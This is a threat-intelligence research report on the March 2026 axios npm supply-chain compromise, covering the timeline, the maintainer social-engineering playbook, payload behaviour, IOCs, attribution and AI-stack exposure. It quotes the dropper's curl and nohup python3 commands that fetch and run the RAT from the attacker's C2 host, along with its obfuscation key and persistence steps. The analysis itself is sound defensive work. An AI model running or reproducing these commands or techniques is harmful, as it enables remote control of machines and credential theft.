# AAGF-2026-079 Research: Axios npm Supply Chain Attack — WAVESHAPER.V2 RAT via Compromised Maintainer Account

**Research date:** 2026-05-08
**Incident date:** 2026-03-31
**Researcher:** Stage 1 Research Agent

---

## Sources Fetched

| Source | Status | Notes |
|--------|--------|-------|
| StepSecurity blog (stepsecurity.io/blog/axios-compromised...) | SUCCESS | Primary technical source; Harden-Runner detection details, IOCs, full timeline |
| Elastic Security Labs (elastic.co/security-labs/axios-one-rat-to-rule-them-all) | SUCCESS | Best technical payload analysis; attribution overlap with WAVESHAPER |
| Datadog Security Labs (securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise) | SUCCESS | Pre-staging details, macOS build artifacts, platform bugs, downstream impact |
| Google Cloud / GTIG blog (cloud.google.com/blog/.../north-korea-threat-actor-targets-axios-npm-package) | PARTIAL | Page rendered as JS config only; attribution details recovered via search results |
| Microsoft Security Blog (microsoft.com/en-us/security/blog/2026/04/01/...) | PARTIAL | Page rendered as JS; Sapphire Sleet attribution recovered via search results |
| Unit42 / Palo Alto Networks (unit42.paloaltonetworks.com/axios-supply-chain-attack) | SUCCESS | MITRE ATT&CK mappings, sector/geographic impact |
| The Hacker News (UNC1069 social engineering article) | SUCCESS | UNC1069 threat actor profile, prior campaigns, WAVESHAPER.V2 details |
| Socket.dev blog (socket.dev/blog/axios-maintainer-confirms-social-engineering...) | SUCCESS | Jason Saayman post-mortem details |
| Snyk blog (snyk.io/blog/axios-npm-package-compromised...) | SUCCESS | Advisory IDs, secondary compromised packages, detection timeline |
| Wiz blog (wiz.io/blog/axios-npm-compromised...) | SUCCESS | 3% execution rate claim, 80% cloud environment presence |
| Huntress blog (huntress.com/blog/supply-chain-compromise-axios-npm-package) | SUCCESS | 135 endpoints detected contacting C2; npm timeline |
| OpenClawAI blog (openclawai.io/blog/stardust-chollima-axios-npm-supply-chain-attack) | SUCCESS | AI framework exposure analysis; LangChain mention |
| Protoslabs threat intel | PARTIAL | No new data beyond known facts |
| cybernews.com article | FAIL | 403 |
| CISA advisory | FAIL | 403 |

---

## 1. Incident Overview

On March 31, 2026, two malicious versions of `axios` — one of the most widely used JavaScript libraries with approximately 100 million weekly downloads — were published to the npm registry via a compromised maintainer account. The attack delivered a cross-platform Remote Access Trojan (RAT) identified as **WAVESHAPER.V2**, a new variant of malware previously attributed to the North Korean threat actor **UNC1069** (tracked by Google/Mandiant) and also referred to as **Sapphire Sleet** (Microsoft) and **BlueNoroff** (Kaspersky, older designation).

The attack was technically sophisticated: it used a staged phantom dependency (`plain-crypto-js`), two-layer XOR obfuscation, C2 traffic masquerading as npm registry traffic, and immediate anti-forensic self-destruction. No malicious code touched the axios library source itself — the entire attack vector was a single modified field in `package.json`.

This incident is **separate and unrelated** to AAGF-2026-076 (the Claude Code sourcemap metadata leak, same date). The two events are coincidentally timed. Socket.dev, which detected both incidents, confirmed no link.

---

## 2. Full Attack Timeline

### Pre-Staging Phase (T-18 hours)

| Timestamp (UTC) | Event |
|----------------|-------|
| 2026-03-30 05:57 | `plain-crypto-js@4.2.0` published by account `nrwise` (nrwise@proton.me) — clean stub to establish package history and reserve namespace |
| 2026-03-30 16:03 | C2 domain `sfrclak[.]com` registered via Namecheap |
| 2026-03-30 23:59:12 | `plain-crypto-js@4.2.1` published with malicious `postinstall` hook added |

### Attack Window

| Timestamp (UTC) | Event |
|----------------|-------|
| 2026-03-31 00:05:41 | Socket.dev automated detection flags `plain-crypto-js@4.2.1` as malware (6 min after publish) |
| 2026-03-31 00:21 | `axios@1.14.1` published by compromised `jasonsaayman` account — tagged as `latest` |
| 2026-03-31 01:00 | `axios@0.30.4` published (39 min after 1.14.1) |
| 2026-03-31 01:30:51 | StepSecurity Harden-Runner detects C2 callback from Backstage CI pipeline — 1.1 seconds into `npm install` |
| 2026-03-31 02:19 | First community issue filed on axios GitHub |
| 2026-03-31 02:32 | Second community issue filed |
| 2026-03-31 ~03:15–03:20 | npm unpublishes both malicious axios versions (~2h54m exposure for 1.14.1, ~2h15m for 0.30.4) |
| 2026-03-31 03:25 | npm initiates security hold on `plain-crypto-js` |
| 2026-03-31 04:08 | Jason Saayman acknowledges compromise publicly |
| 2026-03-31 04:26 | npm replaces `plain-crypto-js` with security stub (total `plain-crypto-js` exposure: ~4h27m) |

### GitHub Issue Deletion (Attacker access to GitHub)

The attacker used write access to the axios GitHub repository (likely also harvested via session hijacking) to **delete the community reports** filed at 02:19 and 02:32 UTC, attempting to suppress awareness during the window. The issues were later restored.

---

## 3. Account Compromise: Jason Saayman Social Engineering

### The Social Engineering Playbook (UNC1069 Methodology)

Jason Saayman, the lead maintainer of axios, confirmed in his post-mortem (GitHub issue #10636) that the compromise resulted from a "targeted social engineering campaign" executed approximately **two weeks before** March 31.

UNC1069's approach was multi-layered:

1. **Initial contact**: Attackers impersonated the founder of a legitimate-appearing company and connected via LinkedIn, establishing rapport over days to weeks.
2. **Fake Slack workspace**: A convincing workspace was created with cloned company branding, plausible CI-related naming, populated channels, realistic team member profiles, and LinkedIn content linking to real company accounts.
3. **Scheduled Teams meeting**: Saayman was invited to a Microsoft Teams call. When connected, "what seemed to be a group of people that were involved" appeared on the call — likely a mix of deepfake or pre-recorded video presence alongside real attacker operators.
4. **ClickFix-style prompt**: During the call, the attacker stated something on Saayman's system was "out of date" and prompted him to install a fix. The install delivered a RAT (the initial-stage implant, likely CosmicDoor or SilentSiphon, not WAVESHAPER.V2 itself).
5. **Session/credential harvest**: With machine-level access, attackers used the installed RAT to "hijack from my browser... lifting sessions or cookies" — bypassing 2FA and OIDC-based publishing protections. Saayman noted that "nothing in the publishing pipeline would have prevented a malicious release, including protections like 2FA or OIDC-based publishing" because the attacker possessed active authenticated sessions.

The attacker also harvested npm's **long-lived classic access tokens** and changed the registered email on the `jasonsaayman` npm account to `ifstap@proton.me`.

### Post-Compromise Discovery

Saayman did not specify the exact moment of discovery. Following the incident, he "wiped all devices, reset all credentials, and began adopting additional security measures, including hardware security keys."

### Why npm's Trusted Publisher Model Was Insufficient

Legitimate axios releases publish via **GitHub Actions with OIDC Trusted Publisher** mechanism — each release creates a cryptographic attestation binding the package to the specific Actions workflow run. Both malicious versions 1.14.1 and 0.30.4 **broke this pattern entirely**:
- Published manually (not via Actions)
- No OIDC binding
- No `gitHead` field
- No corresponding GitHub commits or tags

This forensic signal — invisible to standard `npm audit` but detectable by provenance-aware tooling — was a clear indicator of compromise in retrospect.

---

## 4. Technical Attack Mechanism

### The Phantom Dependency Pattern

Both malicious axios versions added `plain-crypto-js@^4.2.1` as a runtime dependency — a package that appears nowhere in any axios source code and serves no legitimate function. Its sole purpose was to trigger the `postinstall` lifecycle hook.

**Zero lines of axios source code were modified.** All 85+ library source files remained bit-for-bit identical between clean and compromised versions. The entire attack resided in one modified field: `package.json`'s dependency list.

### plain-crypto-js@4.2.1: The Dropper (`setup.js`)

**SHA-256 of setup.js:** `e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09`

**Obfuscation scheme (two layers):**
1. String reversal + Base64 decoding
2. XOR cipher using key `"OrDeR_7077"` with position-dependent index: `7 * i² % 10`
   - Effective key bytes: `[0,0,0,0,0,0,7,0,7,7]`

All critical strings — URLs, shell commands, platform detection logic — were stored in an encoded array (`stq[]`) and decoded at runtime.

**C2 masquerade:** HTTP POST requests used the path prefix `packages.npm.org/product0|1|2` to disguise outbound traffic as benign npm registry communication in network logs. All traffic was unencrypted HTTP (no TLS).

### Platform Detection and Payload Delivery

The dropper detected OS platform and branched into three routines:

**macOS (darwin):**
```
curl -o /Library/Caches/com.apple.act.mond \
  -d packages.npm.org/product0 \
  -s http://sfrclak.com:8000/6202033
```
- Delivery via AppleScript/`osascript`
- Mach-O universal binary (x86_64 + arm64)
- AppleScript file self-deletes after execution
- The binary contained a leaked developer build path: `/Users/mac/Desktop/Jain_DEV/client_mac/macWebT/` and Xcode project name `macWebT`

**Windows (win32):**
- Copies legitimate PowerShell to `%PROGRAMDATA%\wt.exe` (persistence artifact)
- Writes VBScript to `%TEMP%\6202033.vbs`
- Downloads stage-2 PowerShell script to `%TEMP%\6202033.ps1`
- Executes with `-WindowStyle Hidden -ExecutionPolicy Bypass`
- Creates persistence via registry Run key (`MicrosoftUpdate`) and `%PROGRAMDATA%\system.bat`
- **Implementation bug:** The `work()` function was defined but never called — persistence was established but the RAT's active beacon loop never activated on Windows. (Datadog assessment: "unfinished refactoring")

**Linux:**
```bash
curl -o /tmp/ld.py -d packages.npm.org/product2 \
  -s http://sfrclak.com:8000/6202033 \
&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &
```
- Python payload dropped to `/tmp/ld.py`
- No persistence mechanism
- **Implementation bug:** `os.getlogin()` fails in containerized environments without TTY attachment (e.g., Docker, CI runners) — causing crashes in the most common Linux deployment targets. Additionally, the binary execution handler referenced an undefined variable (`b64_string` instead of its intended parameter), preventing C2 payload delivery on Linux.

### Anti-Forensics: The Manifest Swap

After executing payloads, the dropper performed three cleanup steps:
1. `fs.unlink(__filename)` — deletes `setup.js`
2. Deletes malicious `package.json`
3. Renames pre-staged `package.md` (clean stub) to `package.json`, reporting version `4.2.0`

**Deception effect:** Post-infection `npm list` shows `plain-crypto-js@4.2.0` — not 4.2.1. Incident responders inspecting their dependency tree would see no indication of the malicious version. The node_modules directory itself (`node_modules/plain-crypto-js/`) remains the definitive IOC — this package directory should not exist in any legitimate axios installation.

### StepSecurity Harden-Runner Detection (Canonical Evidence)

The Backstage project's CI pipeline provided the most forensically detailed public evidence:

```
01:30:51Z  curl (PID 2401) → sfrclak.com:8000  [1.1s after npm install start]
01:31:27Z  nohup (PID 2400) → sfrclak.com:8000  [36s later, detached to init]
```

**Process tree:**
```
PID 2391: sh -c "node setup.js"  (postinstall hook)
  └─ PID 2392: node setup.js
       └─ PID 2399: /bin/sh -c "curl ... && nohup python3..."
            ├─ PID 2401: curl  (orphaned)
            └─ PID 2400: nohup  (ppid: 1 — detached to init)
```

**File integrity events (two writes to `plain-crypto-js/package.json`):**
- Write 1 at 01:30:50.905Z: malicious manifest with postinstall hook
- Write 2 at 01:31:27.736Z: clean stub (36-second gap = execution time)

Harden-Runner flagged this as a **"Source Code Overwritten"** file integrity event. The Backstage team verified their workflow was "intentionally sandboxed" and the malicious install did not reach production.

---

## 5. WAVESHAPER.V2: RAT Capabilities

### Malware Family Attribution

The macOS payload (`com.apple.act.mond`) shows "significant overlap with WAVESHAPER, a C++ backdoor tracked by Mandiant and attributed to UNC1069." WAVESHAPER.V2 represents an evolution:

| Feature | WAVESHAPER (original) | WAVESHAPER.V2 |
|---------|----------------------|----------------|
| Protocol | Raw binary C2 | JSON over HTTP |
| System info collected | Basic | Extended (hardware model, CPU, running processes) |
| Command set | Limited | Expanded (peinject, runscript, rundir, kill) |
| Platforms | macOS, Linux | macOS + Windows + Linux |
| Packing | Code packing | Not packed |
| User-Agent | N/A | Hardcoded IE8 string |

### C2 Communication Protocol

- **Transport:** HTTP POST, Base64-encoded JSON body
- **User-Agent:** `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)` (IE8 — anachronistic, consistent across all three platforms, likely a deliberate signature or oversight)
- **Session UID:** 16-character random alphanumeric string, generated per execution
- **Beacon interval:** 60 seconds
- **Message types (outbound):** `FirstInfo`, `BaseInfo`, `CmdResult`
- **Command types (inbound):** `kill`, `peinject`, `runscript`, `rundir`

### FirstInfo Beacon (on initial connection)

Directory listings sent immediately:
- Home directory (`~`)
- `~/Desktop`
- `~/Documents`
- `~/.config`
- Windows: drive roots

### BaseInfo Beacon (every 60 seconds)

Transmitted fields:
- Hostname, username
- OS type and version
- CPU architecture
- Timezone and boot time
- Hardware model
- CPU details
- List of running processes

### Command Capabilities

| Command | Function |
|---------|----------|
| `kill` | Self-terminate RAT process |
| `peinject` | Deliver binary payload; Windows uses reflective .NET assembly loading into `cmd.exe`; macOS/Linux drop to disk |
| `runscript` | Execute platform-native code (PowerShell, AppleScript, shell/Python) |
| `rundir` | Interactive filesystem enumeration with metadata |

---

## 6. Infrastructure / IOCs

### C2 Server
- **Domain:** `sfrclak[.]com`
- **IP:** `142.11.206.73`
- **Registrar:** Namecheap
- **Hosting:** Hostwinds
- **Port/path:** `:8000/6202033`
- **Campaign ID:** `6202033` (also used as filename stem: `6202033.ps1`, `6202033.vbs`)

### Attacker npm Accounts
- `nrwise` / `nrwise@proton.me` — created to publish plain-crypto-js decoy
- `jasonsaayman` (compromised) — email changed to `ifstap@proton.me` post-takeover

### Package Hashes

| Package | Version | SHA-1 (npm shasum) |
|---------|---------|-------------------|
| axios | 1.14.1 | 2553649f2322049666871cea80a5d0d6adc700ca |
| axios | 0.30.4 | d6f3f62fd3b9f5432f5782b62d8cfd5247d5ee71 |
| plain-crypto-js | 4.2.1 | 07d889e2dadce6f3910dcbc253317d28ca61c766 |
| plain-crypto-js | 4.2.0 (clean stub) | (pre-staged decoy) |

**Safe baseline:**
- axios@1.14.0 shasum: `7c29f4cf2ea91ef05018d5aa5399bf23ed3120eb`

### Payload Hashes (SHA-256)

| File | Hash |
|------|------|
| setup.js (dropper) | e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09 |
| macOS binary (com.apple.act.mond) | 92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a |
| Windows PS1 (6202033.ps1) | 617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101 |
| Linux Python (ld.py) | fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf |

### File System Artifacts

| Platform | Path | Purpose |
|----------|------|---------|
| macOS | `/Library/Caches/com.apple.act.mond` | RAT binary |
| Windows | `%PROGRAMDATA%\wt.exe` | Renamed PowerShell (persistence) |
| Windows | `%TEMP%\6202033.vbs` | VBScript loader |
| Windows | `%TEMP%\6202033.ps1` | Stage-2 PowerShell RAT |
| Windows | `%PROGRAMDATA%\system.bat` | Persistence launcher |
| Linux | `/tmp/ld.py` | Python RAT |

### Registry (Windows Persistence)
- Key: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- Value: `MicrosoftUpdate`

### Additional Compromised Packages (Secondary)
Two additional npm packages were flagged by Snyk as part of the same attack cluster:
- `@qqbrowser/openclaw-qbot@0.0.130`
- `@shadanai/openclaw` (versions `2026.3.31-1`, `2026.3.31-2`)

---

## 7. CVE / Advisory Status

No traditional MITRE CVE number was assigned as of research date. The vulnerability received tracking through:

| Identifier | Database |
|------------|----------|
| **GHSA-fw8c-xr5c-95f9** | GitHub Advisory Database — "Embedded Malicious Code via compromised maintainer account" |
| **MAL-2026-2307** | OSV (Open Source Vulnerability) database |
| **SNYK-JS-AXIOS-15850650** | Snyk — primary axios advisory |
| **SNYK-JS-PLAINCRYPTOJS-15850652** | Snyk — malicious dependency |
| **SNYK-JS-QQBROWSEROPENCLAWQBOT-15850776** | Snyk — secondary package |
| **SNYK-JS-SHADANAIOPENCLAW-15850775** | Snyk — secondary package |

The GHSA-fw8c-xr5c-95f9 advisory is accessible via GitLab's advisory mirror at `advisories.gitlab.com/pkg/npm/axios/GHSA-fw8c-xr5c-95f9/`.

---

## 8. Confirmed Victims and Downstream Impact

### Named/Confirmed Victims

**Backstage project (CNCF):** Confirmed malicious package installation via StepSecurity Harden-Runner. The team verified the workflow was "intentionally sandboxed" and the malicious install did not reach production. Backstage is widely used as a developer portal framework in enterprise environments.

**Datadog:** Acknowledged exposure and referenced "several components" affected. Directed customers to their Trust Center for details. No specifics disclosed.

**Huntress partner base:** At least **135 endpoints across all operating systems** contacting the attacker's C2 infrastructure during the exposure window — detected within Huntress's monitored customer base only. Total global exposure is unknown multiples larger.

### Quantitative Exposure

- **Wiz observation:** axios present in ~80% of cloud and code environments; **3% of affected environments showed observed execution** of the malicious postinstall hook (i.e., 3% of systems that had axios installed actually ran `npm install` against the malicious version during the 3-hour window).
- **174,000 dependent npm packages** depend on axios (Datadog figure).
- **The popular `slack-github-action`** (used by 23,000+ GitHub repositories) depended on axios and transmitted the malicious version to affected workflows.
- **Affected sectors** (per Palo Alto Unit42): Business services, customer service, financial services, high tech, higher education, insurance, media/entertainment, medical equipment, professional/legal services, retail services.
- **Geographic scope:** US, Europe, Middle East, South Asia, Australia.

### What "3% execution" Means in Context

The 3% figure refers to environments with axios installed that ran `npm install` during the ~3-hour window. With 100M weekly downloads, that implies roughly 600K weekly installs — the 3-hour window represents roughly 1/56 of a week, or ~10,700 npm install operations globally that could have fetched the malicious version. 3% execution suggests actual payload execution in ~320 environments during the window — the Huntress figure of 135 within their partner base alone suggests the real number is substantially higher globally.

---

## 9. Threat Actor Attribution

### UNC1069 (Google/Mandiant designation)

**Track record:** Active since at least 2018. Financially motivated North Korea-nexus threat actor. Previously linked to BlueNoroff (Kaspersky), Sapphire Sleet (Microsoft), Stardust Chollima, and TA444.

**Historical targeting:** Cryptocurrency exchanges, financial institutions, crypto founders, VCs. The shift to open-source software maintainers represents a strategic evolution — compromising widely-adopted packages multiplies the financial theft opportunity by orders of magnitude.

**Known malware suite:**
- CosmicDoor (Nim-based macOS backdoor; Go variant for Windows)
- SilentSiphon (credential stealer targeting browsers, password managers, dev tools)
- WAVESHAPER / WAVESHAPER.V2 (C++ backdoor/downloader)
- HYPERCALL, SUGARLOADER, HIDDENCALL, SILENCELIFT, DEEPBREATH, CHROMEPUSH (secondary payloads)

**Attribution confidence:** HIGH. Google GTIG publicly attributed to UNC1069. Microsoft independently attributed to Sapphire Sleet (same cluster). Elastic Security Labs identified "significant overlap" between macOS payload and previously-documented WAVESHAPER samples.

### Attribution Divergence: Microsoft vs. Google

Microsoft designated the actor as **Sapphire Sleet** (also called CryptoCore/CageyChameleon) while Google designated it **UNC1069**. Both designate the same North Korean financial-theft cluster with BlueNoroff/APT38 affiliation. The naming divergence reflects different vendor taxonomies for the same state-sponsored actor; both point to DPRK Lazarus Group sub-units.

### Broader Campaign Context

This attack was not isolated. Socket.dev identified over **1,700 malicious npm/PyPI/Go/Rust/Packagist packages** linked to North Korean activity since January 2025 as part of the "Contagious Interview" campaign. The axios compromise was a distinct, higher-value operation by the same national infrastructure — targeting a high-visibility package maintainer rather than publishing typosquats.

Multiple Node.js maintainers — including creators of Lodash, Fastify, and dotenv — were simultaneously targeted using identical social engineering methodology, suggesting coordinated, scalable social engineering operations against the most depended-upon open-source maintainers.

### No Link to AAGF-2026-076

The Claude Code sourcemap metadata leak (AAGF-2026-076, same date) is a **separate and unrelated incident**. Socket.dev, which detected both events in real time, confirmed no connection. The two events are coincidentally timed. AAGF-2026-076 involved Anthropic's Claude Code CLI exposing internal build metadata in sourcemaps — a software engineering oversight, not a supply chain attack or state actor operation.

---

## 10. AI Ecosystem Exposure

### Axios as AI Agent Infrastructure

Axios is not merely a generic HTTP library — it is deeply embedded in the JavaScript/TypeScript AI agent stack:

- **LangChain.js** uses axios for HTTP transport in tool-calling and API integrations
- **LangGraph.js** inherits axios dependency transitively through LangChain dependencies
- **OpenClaw and similar AI orchestration frameworks** use axios for inter-service HTTP
- **Any Node.js-based AI agent** making HTTP calls to OpenAI, Anthropic, Cohere, or other LLM APIs likely has axios in its dependency tree, directly or transitively

The OpenClawAI analysis explicitly identified the threat model: a compromised HTTP client in an AI agent process can silently exfiltrate API keys with billing attached (OpenAI, Anthropic, cloud providers) alongside conversation data — all before the agent completes its first tool call.

### Why AI Agents Are Disproportionately Exposed

1. **Credential density**: AI agent processes typically hold multiple high-value credentials simultaneously — LLM API keys, database credentials, cloud provider tokens, third-party API keys. A single `npm install` during agent startup or CI/CD deployment could expose all of them.

2. **Automated CI/CD triggers**: AI agent frameworks are typically deployed via automated pipelines that run `npm install` on every commit or deployment — exactly the pattern that maximizes exposure during a supply chain attack window.

3. **Long-running agent processes**: WAVESHAPER.V2's 60-second beacon loop and `peinject` capability means that once installed, it can silently receive and execute new payloads while the AI agent is actively running user workloads.

4. **No human in the loop during install**: Unlike a human developer who might notice unusual behavior, CI/CD pipelines run silently. The 3-hour window would capture every automated deployment that ran during that period.

5. **Developer machines**: The RAT's `FirstInfo` beacon immediately exfiltrates home directory listings, Desktop, and Documents — developer machines building AI frameworks would expose project codebases, proprietary system prompts, API keys stored in `.env` files, and access to internal tooling.

### The Near-Miss for AI Infrastructure

UNC1069's financial motivation makes the AI agent ecosystem a primary target for credential exfiltration:
- AI agent API keys often have spending limits in the hundreds to thousands of dollars
- Compromised agent credentials enable silent LLM API abuse, data exfiltration through AI APIs, and lateral movement to cloud infrastructure
- The `peinject` capability could deploy more sophisticated implants capable of intercepting in-flight LLM requests and responses — the AI equivalent of a TLS intercept on agent traffic

---

## 11. npm Registry and Ecosystem Response

### npm Actions

- Detected and removed malicious axios versions within ~3 hours
- Initiated security hold on `plain-crypto-js` within ~10 minutes of removing axios
- Replaced `plain-crypto-js` with security stub within ~4.5 hours of initial publication

### Third-Party Detection

- **Socket.dev:** Flagged `plain-crypto-js@4.2.1` as malware **6 minutes after publication** (00:05:41 UTC), before either malicious axios version was published. This was the earliest public signal.
- **StepSecurity Harden-Runner:** Detected C2 callout in Backstage CI pipeline within 1.1 seconds of `npm install`.
- **CISA:** Issued official advisory on 2026-04-20 (20 days post-incident).

### Community Trust Impact

The attack exploited multiple layers of assumed trust:
1. Trust in established, long-maintained packages (axios has 15+ years of history)
2. Trust in individual named maintainers
3. Trust in the npm Trusted Publisher/OIDC system (bypassed via session hijacking, not forged)
4. Trust in postinstall hooks (a legitimate npm mechanism repurposed as attack vector)

---

## 12. MITRE ATT&CK Mapping

| Technique ID | Name | Implementation |
|-------------|------|----------------|
| T1195.002 | Supply Chain Compromise: Compromise Software Supply Chain | Malicious versions published via hijacked maintainer account |
| T1566.002 | Phishing: Spearphishing Link | LinkedIn/Teams-based social engineering of Jason Saayman |
| T1204.002 | User Execution: Malicious File | Victim prompted to install fake "system update" via ClickFix |
| T1105 | Ingress Tool Transfer | C2 downloads platform-specific payloads post-install |
| T1204.005 | User Execution: Malicious File (npm) | postinstall hook triggers without user knowledge |
| T1053.005 | Scheduled Task/Job | Windows registry Run key + system.bat for persistence |
| T1036.005 | Masquerading: Match Legitimate Name | `wt.exe` (Windows Terminal name), `/com.apple.act.mond` (Apple cache name) |
| T1070.004 | Indicator Removal: File Deletion | `setup.js` self-deletes; `package.json` replaced with clean stub |
| T1082 | System Information Discovery | BaseInfo beacon: hostname, OS, arch, processes, hardware |
| T1083 | File and Directory Discovery | FirstInfo beacon: home, Desktop, Documents, .config listings |
| T1219 | Remote Access Software | Full RAT with persistent C2 beacon |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP POST C2 via sfrclak.com:8000 |
| T1027 | Obfuscated Files or Information | Two-layer XOR + Base64 obfuscation of dropper |

---

## 13. Classification Assessment

### Category
**Supply Chain Compromise** (primary) — Insider/Maintainer Account Takeover sub-type.

Social engineering → machine compromise → credential harvest → package registry takeover → malicious dependency injection → RAT delivery.

### Severity Assessment: CRITICAL

Justification:
- Package with ~100M weekly downloads
- Nation-state actor (DPRK) with financial motivation
- Cross-platform RAT with immediate credential exfiltration
- Anti-forensics obscures infection post-execution
- AI agent infrastructure specifically exposed via LangChain, LangGraph, and similar frameworks
- Potential for second-stage `peinject` payloads amplifies damage beyond initial RAT
- 174,000 dependent npm packages; transitive exposure is effectively unbounded

### actual_vs_potential Assessment

**Recommended:** `"partial"`

Rationale:
- The malicious packages were genuinely downloaded and executed during the 3-hour window
- Huntress confirmed 135+ endpoints contacted C2
- BUT: the Windows RAT had an implementation bug (`work()` never called) — persistence was established but the active beacon loop never ran
- AND: the Linux payload crashed in containerized environments (the most common CI/CD target)
- Only the macOS payload functioned fully as intended
- "Actual" damage is real (credentials exposed on macOS machines, 135+ C2 beacons) but the full damage potential was not realized due to implementation bugs in two of three platform payloads

**potential_damage:** If the Windows and Linux payloads had functioned correctly, an unknown but likely large number of CI/CD pipelines and developer machines running `npm install` during the window would have had persistent RAT infections with credential-exfiltrating capabilities — across software companies, financial institutions, AI labs, and cloud providers that use axios. Given 174,000 dependent packages and 100M weekly downloads, the potential for cascading credential theft across the software industry was effectively uncapped.

**intervention:**
1. Socket.dev automated detection 6 minutes post-publish (though too late to prevent the first axios publish)
2. StepSecurity Harden-Runner runtime network monitoring in CI
3. npm security team removal within ~3 hours
4. Implementation bugs in Windows and Linux payloads limited actual RAT functionality to macOS
5. The 3-hour window, while long, avoided the Monday morning global CI/CD surge

---

## 14. Key Research Uncertainties

- **Total global RAT infection count:** Unknown. Only Huntress's partner-base figure (135 endpoints) is public. True number may be orders of magnitude higher.
- **What UNC1069 actually stole:** No confirmed disclosure of what credentials or data was exfiltrated from the 135+ C2-contacting systems.
- **GitHub write access mechanism:** How exactly did the attacker obtain write access to the axios GitHub repository (to delete community issues) is not fully clarified — likely same session-hijacking as npm.
- **Other simultaneous maintainer targets:** THN reported that Lodash, Fastify, and dotenv maintainers were targeted with identical methodology. Whether any of those succeeded is not confirmed in sources fetched.
- **CISA advisory content:** 403 error prevented fetching full text — may contain additional victim or remediation details.
- **Microsoft blog full text:** Page rendered as JavaScript config only — Sapphire Sleet attribution details sourced from secondary reporting.

---

## Sources

- [StepSecurity: axios Compromised on npm](https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan)
- [Elastic Security Labs: Inside the Axios supply chain compromise](https://www.elastic.co/security-labs/axios-one-rat-to-rule-them-all)
- [Datadog Security Labs: Axios npm Supply Chain Compromise](https://securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise/)
- [Google Cloud Blog: North Korea-Nexus Threat Actor Compromises Axios](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package)
- [Microsoft Security Blog: Mitigating the Axios npm supply chain compromise](https://www.microsoft.com/en-us/security/blog/2026/04/01/mitigating-the-axios-npm-supply-chain-compromise/)
- [Unit42 / Palo Alto: Threat Brief: Widespread Impact of the Axios Supply Chain Attack](https://unit42.paloaltonetworks.com/axios-supply-chain-attack/)
- [The Hacker News: UNC1069 Social Engineering of Axios Maintainer](https://thehackernews.com/2026/04/unc1069-social-engineering-of-axios.html)
- [The Hacker News: Google Attributes Axios npm Supply Chain Attack to UNC1069](https://thehackernews.com/2026/04/google-attributes-axios-npm-supply.html)
- [The Hacker News: N. Korean Hackers Spread 1,700 Malicious Packages](https://thehackernews.com/2026/04/n-korean-hackers-spread-1700-malicious.html)
- [Socket.dev: Axios Maintainer Confirms Social Engineering](https://socket.dev/blog/axios-maintainer-confirms-social-engineering-behind-npm-compromise)
- [Snyk: Axios npm Package Compromised](https://snyk.io/blog/axios-npm-package-compromised-supply-chain-attack-delivers-cross-platform/)
- [Wiz: Axios NPM Distribution Compromised](https://www.wiz.io/blog/axios-npm-compromised-in-supply-chain-attack)
- [Huntress: Supply Chain Compromise of axios npm Package](https://www.huntress.com/blog/supply-chain-compromise-axios-npm-package)
- [OpenClawAI: Stardust Chollima Axios npm Supply Chain Attack](https://openclawai.io/blog/stardust-chollima-axios-npm-supply-chain-attack)
- [Protoslabs: Axios npm Supply-Chain Compromise 2026](https://www.protoslabs.io/resources/axios-npm-supply-chain-compromise-2026-03-31)
- [GHSA-fw8c-xr5c-95f9: GitHub Advisory Database](https://github.com/advisories/GHSA-fw8c-xr5c-95f9)
- [CISA Advisory (April 20, 2026)](https://www.cisa.gov/news-events/alerts/2026/04/20/supply-chain-compromise-impacts-axios-node-package-manager)
- [SOCRadar: Axios npm Hijack 2026 CISO Guide](https://socradar.io/blog/axios-npm-supply-chain-attack-2026-ciso-guide/)
- [Arctic Wolf: Supply Chain Attack Impacts Widely Used Axios npm Package](https://arcticwolf.com/resources/blog/supply-chain-attack-impacts-widely-used-axios-npm-package/)
- [Dark Reading: Axios Attack: How Complex Social Engineering Is Industrialized](https://www.darkreading.com/threat-intelligence/axios-attack-complex-social-engineering-industrialized)
- [Tenable: FAQ About the Axios npm Supply Chain Attack by UNC1069](https://www.tenable.com/blog/faq-about-the-axios-npm-supply-chain-attack-by-north-korea-nexus-threat-actor-unc1069)
- [axios GitHub Issue #10636 (Post-mortem)](https://github.com/axios/axios/issues/10636)
- [axios GitHub Issue #10604 (Original community report)](https://github.com/axios/axios/issues/10604)
